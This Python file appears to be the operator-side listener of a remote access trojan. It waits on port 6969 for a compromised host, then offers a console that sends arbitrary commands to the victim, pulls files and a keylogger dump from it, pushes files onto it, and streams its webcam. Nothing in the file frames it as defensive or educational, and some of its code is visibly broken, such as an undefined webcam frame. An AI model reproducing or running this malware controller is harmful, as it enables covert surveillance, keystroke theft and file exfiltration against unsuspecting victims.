import socket
from V2 import malware_code
from sys import argv
from time import sleep
# from pickle import loads
from os.path import getsize
from struct import unpack, calcsize
from cv2 import imshow, destroyAllWindows, waitKey

malware = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
malware.bind(('', 6969))
malware.listen(1)
print('Listener running and waiting for connection') 
malware, ip = malware.accept()
print('Listener running with connection from ' + str(ip))


webcam_port = 6970
def webcam():
    data = b''
    payload_size = calcsize("L")
    while True:
        while len(data) < payload_size:
            data += malware.recv(61440)
        packed_msg_size = data[:payload_size]

        data = data[payload_size:]
        msg_size = unpack("L", packed_msg_size)[0]
        while len(data) < msg_size:   
            data += malware.recv(61440)
        frame_data = data[:msg_size]
        data = data[msg_size:]
        # frame = loads(frame_data)
        imshow('ds', frame)
        key = waitKey(27)
        if key == 27:
            destroyAllWindows()
            break

def download():
    malware.send(command.encode())
    recv = malware.recv(1024).decode().split(',')
    size = int(recv[0])
    name = recv[1]
    malware.send('0'.encode())

    with open(name, "wb") as f:
        read_data = malware.recv(size)
        while read_data:
            f.write(read_data)
            read_data = malware.recv(size)
            if read_data == b"DONE":
                break
        print('Successfully downloaded file\nBytes recieved: ' + str(size))

def upload(recv):
    name = malware_code.parameter_finder(recv)
    print(name)
    size = getsize(name)
    malware.send(f'{str(size)},{name}'.encode())
    malware.recv(1024)

    with open(name, "rb") as f:
        file_data = f.read(size)
        while file_data:
            malware.send(file_data)
            file_data = f.read(size)
            sleep(5)
            malware.send(b"DONE")
            break
    print('Successfully uploaded file\nBytes sent: ' + str(size))


while True:
    command = input('> ')
    if command == '' or command.isspace() == True:
        pass
    elif command.find('download') == 0:
        download()
    elif command.find('upload') == 0:
        malware.send('upload'.encode())
        upload(command)
    elif command == 'keylogger dump':
        download()
    elif command == 'info':
        malware.send(command.encode())
        recv = malware.recv(1024).decode().replace('ip', str(ip))
        print(recv)
    elif command == 'webcam':
        malware.send(command.encode())
        webcam()
    else:
        malware.send(command.encode())
        recv = malware.recv(1024).decode()
        print(recv)
